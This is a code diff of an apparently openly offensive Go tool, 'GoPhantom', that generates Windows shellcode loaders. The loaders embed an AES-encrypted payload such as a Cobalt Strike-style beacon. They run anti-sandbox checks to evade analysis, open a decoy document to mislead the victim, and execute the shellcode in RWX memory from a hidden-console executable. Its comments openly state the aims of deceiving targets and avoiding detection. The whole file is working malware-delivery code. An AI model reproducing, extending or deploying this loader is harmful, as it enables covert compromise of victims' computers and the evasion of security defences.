@@ -16,22 +16,22 @@ import (
 )
 
 const logo = `
-   ______      ____  _                          _   
-  / ____/___  / __ \(_)___  ____  ___  _________/ |  
- / / __/ __ \/ /_/ / / __ \/ __ \/ _ \/ ___/ __  /   
-/ /_/ / /_/ / ____/ / / / / / / /  __/ /  / /_/ /    
-\____/\____/_/   /_/_/ /_/_/ /_/\___/_/   \__,_/     
-                                                    
-              >> Advanced Payload Loader Generator <<
+   ___        ___ _                 _                  
+  / _ \___   / _ \ |__   __ _ _ __ | |_ ___  _ __ ___  
+ / /_\/ _ \ / /_)/ '_ \ / _' | '_ \| __/ _ \| '_ ' _ \ 
+/ /_\\ (_) / ___/| | | | (_| | | | | || (_) | | | | | |
+\____/\___/\/    |_| |_|\__,_|_| |_|\__\___/|_| |_| |_|
+
+          >> Advanced Payload Loader Generator <<
                                            by hsad
 `
 
-// loaderTemplate 是最终加载器可执行文件的 Go 源代码。
+// loaderTemplate 是最终加载器可执行文件的 Go 源代码模板。
 const loaderTemplate = `
 //go:build windows
 // +build windows
 
-// 最终加载器 - 此代码由 GoFilePacker 生成
+// 由 GoPhantom 生成的最终加载器
 package main
 
 import (
@@ -39,17 +39,15 @@ import (
 	"crypto/cipher"
 	"encoding/base64"
 	"fmt"
-	"log"
 	"os"
 	"path/filepath"
 	"runtime"
 	"time"
 	"unsafe"
-
 	"golang.org/x/sys/windows"
 )
 
-// 这些常量由生成器动态替换。
+// 这些常量由生成器在编译时动态注入。
 const (
 	encryptedShellcodeBase64 = "{{.EncryptedPayload}}"
 	encryptedDecoyBase64     = "{{.EncryptedDecoy}}"
@@ -57,50 +55,38 @@ const (
 	decoyFileName            = "{{.DecoyFileName}}"
 )
 
-// setupLogging 设置日志输出到文件，方便在无控制台模式下调试
-func setupLogging() {
-	logFile, err := os.OpenFile(filepath.Join(os.Getenv("PUBLIC"), "loader_log.txt"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
-	if err == nil {
-		log.SetOutput(logFile)
-	}
-	log.Println("--- Loader execution started ---")
-}
-
-// decryptAESGCM 使用 AES-256-GCM 解密数据。
+// decryptAESGCM 使用 AES-256-GCM 解密 Base64 编码的数据。
 func decryptAESGCM(encodedCiphertext, encodedKey string) ([]byte, error) {
 	key, err := base64.StdEncoding.DecodeString(encodedKey)
-	if err != nil {
-		return nil, fmt.Errorf("密钥解码失败: %v", err)
-	}
+	if err != nil { return nil, fmt.Errorf("key decoding failed: %v", err) }
+	
 	ciphertext, err := base64.StdEncoding.DecodeString(encodedCiphertext)
-	if err != nil {
-		return nil, fmt.Errorf("密文解码失败: %v", err)
-	}
+	if err != nil { return nil, fmt.Errorf("ciphertext decoding failed: %v", err) }
+
 	block, err := aes.NewCipher(key)
-	if err != nil {
-		return nil, fmt.Errorf("创建新密码块失败: %v", err)
-	}
+	if err != nil { return nil, fmt.Errorf("failed to create new cipher: %v", err) }
+
 	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, fmt.Errorf("创建新 GCM 失败: %v", err)
-	}
+	if err != nil { return nil, fmt.Errorf("failed to create new GCM: %v", err) }
+
 	nonceSize := gcm.NonceSize()
-	if len(ciphertext) < nonceSize {
-		return nil, fmt.Errorf("密文过短")
-	}
+	if len(ciphertext) < nonceSize { return nil, fmt.Errorf("ciphertext is too short") }
+
 	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
-	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
-	if err != nil {
-		return nil, fmt.Errorf("解密失败: %v", err)
-	}
-	return plaintext, nil
+	return gcm.Open(nil, nonce, ciphertext, nil)
 }
 
-// antiSandboxChecks 执行基本的环境检查以检测沙箱。
+// antiSandboxChecks 执行基本的反沙箱环境检查，以规避自动化分析。
 func antiSandboxChecks() {
+	// 沙箱环境通常分配较少的CPU核心。
+	if runtime.NumCPU() < 2 {
+		os.Exit(0)
+	}
+
+	// 沙箱环境通常分配较少的物理内存。
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	globalMemoryStatusEx := kernel32.NewProc("GlobalMemoryStatusEx")
-
+	
 	type memoryStatusEx struct {
 		Length               uint32
 		MemoryLoad           uint32
@@ -118,42 +104,37 @@ func antiSandboxChecks() {
 	
 	ret, _, _ := globalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memStatex)))
 	if ret != 0 {
+		// 若物理内存小于 4GB，则判定为沙箱环境并退出。
 		if memStatex.TotalPhys/1024/1024/1024 < 4 {
 			os.Exit(0)
 		}
 	}
-
-	if runtime.NumCPU() < 2 {
-		os.Exit(0)
-	}
 }
 
-// executeShellcode 分配内存，复制 shellcode，并在一个新线程中执行它。
-// [!] 修改点: 移除了 WaitForSingleObject，实现"Fire and Forget"
+// executeShellcode 分配内存，复制并以 "Fire and Forget" 模式执行 shellcode。
 func executeShellcode(shellcode []byte) {
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	virtualAlloc := kernel32.NewProc("VirtualAlloc")
 	createThread := kernel32.NewProc("CreateThread")
 
+	// 使用 VirtualAlloc 在当前进程中分配一块具有读、写、执行权限的内存。
 	addr, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
 	if addr == 0 {
-		return // Allocation failed
+		return // 分配失败则静默退出，不暴露行为。
 	}
 
+	// 将 shellcode 复制到新分配的内存中。
 	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode):len(shellcode)]
 	copy(dst, shellcode)
 	
-	// Launch the thread and immediately return. Do not wait for it.
+	// 使用 CreateThread 在新线程中执行 shellcode，实现与主线程分离。
 	createThread.Call(0, 0, addr, 0, 0, 0)
 }
 
 func main() {
-	// Anti-sandbox and logging can be removed for the final production version
-	// to reduce binary size and behavioral signatures.
-	// setupLogging() 
 	antiSandboxChecks()
 
-	// Decoy file execution
+	// 解密并执行诱饵文件，迷惑目标用户。
 	decoyBytes, err := decryptAESGCM(encryptedDecoyBase64, aesKeyBase64)
 	if err == nil {
 		decoyPath := filepath.Join(os.Getenv("PUBLIC"), decoyFileName)
@@ -164,20 +145,18 @@ func main() {
 		windows.ShellExecute(0, verb, path, nil, nil, windows.SW_SHOWNORMAL)
 	}
 	
-	// Shellcode execution in a new goroutine
+	// 在后台解密并执行核心荷载。
 	shellcode, err := decryptAESGCM(encryptedShellcodeBase64, aesKeyBase64)
-	if err != nil {
-		return
+	if err == nil {
+		executeShellcode(shellcode)
 	}
-	executeShellcode(shellcode)
 
-	// The main program can exit here. For the test, a small sleep ensures
-	// the decoy has time to pop, but in a real scenario, you might exit faster.
-	time.Sleep(2 * time.Second)
+	// 短暂休眠以确保诱饵文件有足够时间弹出，增强伪装效果。
+	time.Sleep(3 * time.Second)
 }
 `
 
-// TemplateData holds the data to be injected into the loader template.
+// TemplateData 用于向模板中注入数据。
 type TemplateData struct {
 	EncryptedPayload string
 	EncryptedDecoy   string
@@ -185,52 +164,59 @@ type TemplateData struct {
 	DecoyFileName    string
 }
 
-// encryptAESGCM encrypts data using a given key with AES-256-GCM.
+// encryptAESGCM 使用 AES-256-GCM 加密数据并返回 Base64 编码的字符串。
 func encryptAESGCM(plaintext []byte, key []byte) (string, error) {
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		return "", err
 	}
+
 	gcm, err := cipher.NewGCM(block)
 	if err != nil {
 		return "", err
 	}
+
 	nonce := make([]byte, gcm.NonceSize())
 	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
 		return "", err
 	}
+
 	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
 	return base64.StdEncoding.EncodeToString(ciphertext), nil
 }
 
 func main() {
-	// [+] 修改点: 打印 Logo 替换旧的标题
-	log.SetFlags(0) // 移除 log 的时间戳等前缀，让 Logo 更干净
+	log.SetFlags(0) // 移除日志前缀，使 Logo 输出更干净
 	log.Println(logo)
 
-	decoyFile := flag.String("decoy", "", "Required: Path to the decoy file (e.g., a PDF or TXT).")
+	// --- 参数定义 ---
+	decoyFile := flag.String("decoy", "", "Required: Path to the decoy file (e.g., a PDF or image).")
 	payloadFile := flag.String("payload", "", "Required: Path to the raw x64 shellcode file (e.g., beacon.bin).")
 	outputFile := flag.String("out", "FinalLoader.exe", "Optional: Final output executable name.")
 	flag.Parse()
 
+	// --- 参数校验 ---
 	if *decoyFile == "" || *payloadFile == "" {
-		log.Println("Error: Both -decoy and -payload flags are required.")
-		log.Println("Usage: go run generator.go -decoy <path_to_decoy> -payload <path_to_payload> [-out <output_name>]")
+		log.Println("\nError: Both -decoy and -payload flags are required.")
+		log.Println("Usage:")
 		flag.PrintDefaults()
 		os.Exit(1)
 	}
 
+	// --- 文件读取 ---
 	decoyBytes, err := os.ReadFile(*decoyFile)
 	if err != nil {
 		log.Fatalf("[-] Failed to read decoy file: %v", err)
 	}
+
 	shellcodeBytes, err := os.ReadFile(*payloadFile)
 	if err != nil {
 		log.Fatalf("[-] Failed to read payload file: %v", err)
 	}
 
+	// --- 加密流程 ---
 	log.Println("[+] Generating unique AES-256-GCM key...")
-	aesKey := make([]byte, 32) // 32 bytes for AES-256
+	aesKey := make([]byte, 32) // AES-256 需要 32 字节的密钥
 	if _, err := rand.Read(aesKey); err != nil {
 		log.Fatalf("[-] Failed to generate AES key: %v", err)
 	}
@@ -247,6 +233,7 @@ func main() {
 		log.Fatalf("[-] Failed to encrypt payload file: %v", err)
 	}
 
+	// --- 模板填充 ---
 	data := TemplateData{
 		EncryptedPayload: encryptedShellcode,
 		EncryptedDecoy:   encryptedDecoy,
@@ -265,6 +252,7 @@ func main() {
 		log.Fatalf("[-] Failed to execute template: %v", err)
 	}
 
+	// --- 编译流程 ---
 	tmpfile, err := os.CreateTemp("", "loader-*.go")
 	if err != nil {
 		log.Fatalf("[-] Failed to create temp file: %v", err)
@@ -279,7 +267,11 @@ func main() {
 	}
 
 	log.Printf("[+] Cross-compiling for windows/amd64 to %s...", *outputFile)
-	cmd := exec.Command("go", "build", "-o", *outputFile, "-ldflags", "-s -w -H windowsgui", tmpfile.Name())
+	// -s: 禁用符号表
+	// -w: 禁用 DWARF 调试信息
+	// -H windowsgui: 编译为 Windows GUI 程序，运行时不显示控制台窗口
+	ldflags := "-s -w -H windowsgui"
+	cmd := exec.Command("go", "build", "-o", *outputFile, "-ldflags", ldflags, tmpfile.Name())
 	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
 
 	output, err := cmd.CombinedOutput()
@@ -287,5 +279,5 @@ func main() {
 		log.Fatalf("[-] Compilation failed:\n%s", string(output))
 	}
 
-	log.Printf("\n[✓] Successfully generated loader: %s", *outputFile)
+	log.Printf("\n[✓] Successfully generated loader: %s\n", *outputFile)
 }
